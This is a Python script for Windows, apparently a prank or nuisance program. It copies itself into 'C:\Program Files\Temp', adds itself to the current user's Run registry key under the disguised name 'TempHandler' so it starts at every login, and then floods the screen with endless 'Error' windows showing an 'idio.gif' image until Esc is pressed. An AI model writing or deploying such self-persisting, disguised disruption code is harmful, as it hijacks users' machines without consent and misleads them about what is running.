import time, shutil, os, threading, sys, random, keyboard
import tkinter as tk
from tkinter import messagebox
import winreg as reg

# Add the program to Windows startup
def add_to_startup(file_path, app_name="registrydictionary"):
    try:
        # Open the registry key for current user's startup programs
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        # Set the value for the application
        reg.SetValueEx(key, app_name, 0, reg.REG_SZ, file_path)
        reg.CloseKey(key)
    except Exception as e:
        messagebox.showerror(title="Error", message=e)

# Determine the source file path
if getattr(sys, 'frozen', False):
    source_file = sys.executable
else:
    source_file = __file__
source_file_for_copied_exe = 'C:\\Program Files\\Temp\\TempHandler.exe'

destination_dir = 'C:\\Program Files\\Temp'

try:
    os.makedirs(destination_dir, exist_ok=True)
    destination_file = os.path.join(destination_dir, os.path.basename(source_file))

    if os.path.abspath(source_file) != os.path.abspath(destination_file):
        if not os.path.exists(destination_file):
            shutil.copy2(source_file, destination_file)
except PermissionError:
    messagebox.showerror(title='Access Denied!', message='You have to run this application as an administrator.')
    sys.exit()
except Exception as e:
    messagebox.showerror(title='Error', message=f'An unexpected error occurred: {e}')
    sys.exit()

add_to_startup(source_file_for_copied_exe, app_name="TempHandler")

running = True

def main():
    global running
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    i = 0
    otherFrames = []

    if getattr(sys, 'frozen', False):
        script_dir = sys._MEIPASS
    else:
        script_dir = os.path.dirname(os.path.abspath(__file__))

    gif_path = os.path.join(script_dir, "idio.gif")

    if not os.path.exists(gif_path):
        messagebox.showerror("Error, this OS is not supported.")
        sys.exit()

    gif = tk.PhotoImage(file=gif_path)


    while running:
        x = random.randint(0, screen_width - 50)
        y = random.randint(0, screen_height - 25)
        win = tk.Toplevel()
        win.geometry(f"492x360+{x}+{y}")
        win.title(f"Error {i}")

        label = tk.Label(win, image=gif)
        label.pack(expand=True)

        otherFrames.append(win)
        i += 1

        if i % 1 == 0:
            time.sleep(0.00001)
            root.update()

    for frame in otherFrames:
        frame.destroy()
    root.destroy()

def monitorKey():
    global running
    keyboard.wait('esc')
    running = False

root = tk.Tk()
root.withdraw()

threading.Thread(target=monitorKey, daemon=True).start()
main()
